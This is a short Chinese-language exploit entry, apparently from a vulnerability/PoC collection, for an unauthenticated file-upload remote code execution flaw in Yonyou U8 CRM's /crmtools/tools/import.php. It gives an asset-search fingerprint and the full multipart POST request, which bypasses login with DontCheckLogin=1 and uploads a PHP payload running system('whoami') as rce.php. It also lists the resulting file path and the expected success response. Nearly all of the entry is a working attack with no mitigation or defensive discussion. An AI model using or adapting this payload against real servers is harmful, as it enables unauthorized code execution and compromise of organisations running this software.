# 用友U8CRMimport.php文件上传致RCE漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="用友U8CRM"`
- **请求**：`POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs…`

**请求体 / payload**
```
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="xfile"; filename="1.xls"
<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="combo"
rce.php
------WebKitFormBoundarye0z8QbHs79gL8vW5--
上传定位
/tmpfile/rce.php
```
- **预期**：200　|　“success”:true